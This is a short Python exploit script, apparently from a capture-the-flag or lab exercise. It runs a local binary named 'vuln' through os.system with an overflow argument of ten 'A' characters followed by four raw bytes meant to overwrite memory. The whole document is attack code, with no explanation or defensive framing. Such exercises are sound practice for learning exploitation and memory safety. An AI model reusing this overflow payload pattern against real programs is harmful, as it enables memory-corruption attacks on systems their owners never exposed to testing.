import os

command = '../vuln ' + ('A' * 10 + '\x43\x43\x32\x30')

print("Executing: " + command)

os.system(command)